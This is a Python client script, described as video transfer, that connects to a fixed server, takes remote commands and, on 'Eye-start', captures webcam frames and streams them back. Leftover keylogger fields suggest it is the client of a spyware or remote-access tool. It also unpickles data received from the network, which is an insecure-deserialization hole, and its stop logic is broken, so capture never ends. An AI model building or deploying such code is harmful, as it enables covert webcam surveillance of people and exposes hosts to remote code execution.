#client code for video transfer which sends screen shots to server 
## Import modules
import socket
import threading
import pickle

import cv2, numpy as np

SERVER_HOST = "192.168.1.82"
SERVER_PORT = 5050

## CLIENT CLASS INITIALISATION ##
class Client:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    count = 0
    keys = []

    def __init__(self,server_ip = SERVER_HOST ,server_port = SERVER_PORT):
        self.sock.connect((server_ip, server_port))

        promptThread = threading.Thread(target=self.prompt, name="bPrompt")
        promptThread.daemon = True
        promptThread.start()
        self.KL_STATE = 0
        self.EYE_STATE = 0
        while True:
            raw_data = self.sock.recv(4096)
            data = pickle.loads(raw_data)
            # data[0] = ID
            # data[1] = DATA_TYPE
            # data[2] = CMD_DATA
            if data[1] == "command":
                self.execute_command(data[2])
            elif not data:
                break
            print(data)



## DATA TREATMENT ##

    def send_data(self,data_type,data):
        raw_data = ["vb",data_type,data]
        data_p = pickle.dumps(raw_data)
        self.sock.sendall(data_p)

    def execute_command(self,command):
        if command == "Eye-start":
            eyeThread = threading.Thread(target=self.eye, name="EyeTh")
            self.EYE_STATE = 1
            eyeThread.start()
        elif command == "Eye-stop":
            self.stopTool("Eye")

        else:
            print("unknown command")
            self.send_data("log_msg","unknown command")

    def prompt(self):
        while True:
            command = input("client@v >")
            self.send_data("command",command)
## KIT ##

    def stopTool(self,tool):
        if tool == "Eye-stop":
            self.EYE_STATE = 0
        else:
            msg = f"{tool} dont exist"
            print(msg)
            self.send_data("stopTool-log",msg)

## 2nd tool : eye
    def eye(self):
        video = cv2.VideoCapture(0)
        while self.EYE_STATE == 1:
            check, frame = video.read()
            gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
            self.send_data("eye",gray)
            if self.EYE_STATE == 0:
                break
        cv2.destroyAllWindows
        video.release()


## MAIN PROGRAM ##

def main ():
    client = Client()

if __name__ == '__main__':
    while True:
        main()